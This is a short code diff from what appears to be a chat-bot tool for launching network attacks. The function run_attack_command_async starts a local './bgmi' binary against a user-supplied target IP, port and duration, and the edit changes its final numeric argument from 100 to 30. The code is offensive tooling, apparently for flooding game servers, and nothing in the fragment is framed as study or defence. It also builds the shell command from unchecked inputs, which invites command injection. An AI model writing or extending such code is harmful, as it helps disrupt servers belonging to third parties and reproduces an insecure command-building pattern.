@@ -70,7 +70,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(1)
 
 async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 30")
     await process.communicate()
 
     # After the attack finishes, update the message
